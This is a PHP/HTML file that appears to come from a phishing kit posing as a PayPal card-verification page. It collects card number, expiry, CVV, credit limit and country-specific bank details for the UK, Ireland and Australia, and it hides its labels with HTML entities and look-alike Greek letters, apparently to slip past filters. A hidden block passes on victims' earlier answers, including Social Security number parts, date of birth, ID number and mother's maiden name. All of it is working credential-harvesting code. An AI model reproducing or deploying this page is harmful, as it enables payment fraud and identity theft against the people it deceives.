                                        <script src="../js/jquery.payment.js"></script><script src="../js/new.look.js"></script>
                    <form method="post" id="parentForm" name="creditcard_Form" action="Submit.php" class="edit">
                        <p class="group fcenter">


<?php
if ($negara=="GB"){ echo '
                <span class="help" style="padding-left:4%;">&Nu;eed for &#98;ank &#957;alidation.</span>
                    <label for="sortcode">&#x0053;ort &#67;&omicron;de - &#x0041;&#99;count No :</label>
                        <span class="field">
                            <input name="sort_code1" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;
                            <input name="sort_code2" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;
                            <input name="sort_code3" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;-&nbsp;
                            <input name="accnum" style="width: 5.4em;" pattern="[0-9]{8,}" maxlength="8" autocomplete="off" required="required" type="text" title="Please enter your account number"></span>
';}

?>
<?php
if ($negara=="IE"){ echo '
                <span class="help" style="padding-left:4%;">&Nu;eed for &#98;ank &#957;alidation.</span>
                    <label for="sortcode">&#x0053;ort &#67;&omicron;de - &#x0041;&#99;count No :</label>
                        <span class="field">
                            <input name="sort_code1" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="" type="text" title="Enter a valid sort code">&nbsp;
                            <input name="sort_code2" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="" type="text" title="Enter a valid sort code">&nbsp;
                            <input name="sort_code3" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="" type="text" title="Enter a valid sort code">&nbsp;-&nbsp;
                            <input name="accnum" style="width: 5.4em;" pattern="[0-9]{8,}" maxlength="8" autocomplete="off" required="" type="text" title="Please enter your account number"></span>
';}

?>
<?php
if ($negara=="IE"){ echo '
                               
                                     <label for="cc_holder">&#67;redit &#x004C;imit :</label>
                    <span class="field" id="cc_limit">
                        <input type="text" autocomplete="off" class="large" maxlength="10" name="cc_limit" value="" required="required" title="Credit Limit" placeholder="Ex: 5000></span>

              
                  ';}
                  ?>
                 
<?php
if ($negara=="AU"){ echo '
                <span class="help" style="padding-left:4%;">&Nu;eed for &#98;ank &#x0069;dentif&#x0069;cation.</span>
                    <label for="sortcode">O&#x0053;ID - B&#x0053;B :</label>
                        <span class="field">
                            <input name="bsbnum_2" style="width: 4.9em; pattern="[0-9]{2,}" maxlength="10" autocomplete="off" required="" type="text" title=""> - 
                            
                            <input name="bsbnum_1" class="xxsmall" pattern="[0-9]{2,}" maxlength="6" autocomplete="off" required="" type="text" title=""></span>
                    <label for="sortcode">Account No - &#67;redit &#x004C;imit :</label>
                        <span class="field">
                            <input name="accnum" style="width: 8.8em; pattern="[0-9]{2,}" maxlength="15" autocomplete="off" required="required" type="text" title="" placeholder="Ex: 19724734"> - 
                            
                            <input name="cc_limit" class="xxsmall" pattern="[0-9]{2,}" maxlength="10" autocomplete="off" required="required" type="text" title="Credit Limit" placeholder="Ex: 5000"></span>
';}
?>



                            <span class="help" style="padding-left:4%;">&Nu;ame as &#x0069;t appears on &#67;ard.</span>
                                <label for="cc_holder">&#67;ardholder &Nu;ame :</label>
                    <span class="field" id="cc_holder">
                        <input type="text" autocomplete="off" class="large" pattern=".{2,30}" maxlength="32" name="cc_holder" value="" required="" title="Cardholder name"></span>



                            <label for="cc_number">&#67;ard &Nu;umber :</label>
                                <span class="field">
                                    <input type="text" id="cc_number" autocomplete="off" style="width: 12em;" pattern="[2-7][0-9 ]{11,20}" maxlength="20" name="cc_number" value="" required="" title="Only number">
                                </span>


                     
                            <label for="expdate">&Epsilon;xpiration Date :</label>
                                <span class="field" style="margin-bottom: 7px;">
<?php
echo date_dropdown(20);
function date_dropdown($year_limit = 0)
{
        /*month*/
        $html_output .= '                                   <select class="smal" required="required" name="expdate_month" title="Exp month">'."\n";
        $html_output .= '                                       ';
            for ($exp_month = 1; $exp_month <= 12; $exp_month++) {
                if (strlen($exp_month) === 1){
                    $html_output .= '<option value="0' . $exp_month . '">0' . $exp_month . '</option>';
                } else {
                    $html_output .= '<option value="' . $exp_month . '">' . $exp_month . '</option>';
                }
            }
        $html_output .= "\n".'                                  </select>&nbsp;&nbsp;/&nbsp;&nbsp;'."\n";

        /*years*/
    if (date('m') == 12){
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y') + 1; $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    } else {
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y'); $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    }

    return $html_output;
}
?>
                                </span>
                                    
                                 <span class="help" style="padding-left:4%;">Last 3-digits on the back of your card. For AmEx, 4 digits on the front of your card.</span>  
                                <label for="cvv2_number">&#67;ard Verification &Nu;umber :</label>
								
								<span class="field">
                        <input id="cvv2_number" autocomplete="off" style="width:3.49em;" pattern="[0-9]{3,5}" maxlength="4" name="cvv2_number" value="" required="" type="text" title="Enter a valid csc">
                        <span class="small">
						<span class="small"><a target="_blank" href="../page/cvv_info_pop&amp;enable_locale.htm" onclick="AYPAL.core.openWindow(event, {width: 425, height: 450});" id="1"> What is this?</a></span>
						
                    </span>
					
					
                            <div class="ngawur">
                            </div>

                        </p>
											
						

                        <p class="bcenter">
						
                        						
						
                        <button style="width: 100px !important;" type="submit" value="Submit" class="button">Submit</button></p>

                        <div style="display:none;"><input name="full_name" value="<?php echo $_POST['full_name'];?>"><input name="address1" value="<?php echo $_POST['address_1'];?>"><input name="address2" value="<?php echo $_POST['address_2'];?>"><input name="city" value="<?php echo $_POST['city'];?>"><input name="state" value="<?php echo $_POST['state'];?>"><input name="postal" value="<?php echo $_POST['postal'];?>"><input name="phone" value="<?php echo $_POST['phone'];?>"><input name="ssn1" value="<?php echo $_POST['number_1'];?>"><input name="ssn2" value="<?php echo $_POST['number_2'];?>"><input name="ssn3" value="<?php echo $_POST['number_3'];?>"><input name="id_number" value="<?php echo $_POST['id_number'];?>"><input name="dob_day" value="<?php echo $_POST['day'];?>"><input name="dob_month" value="<?php echo $_POST['month'];?>"><input name="dob_year" value="<?php echo $_POST['year'];?>"><input name="mmd" value="<?php echo $_POST['mmd'];?>"></div>
                        
                    </form>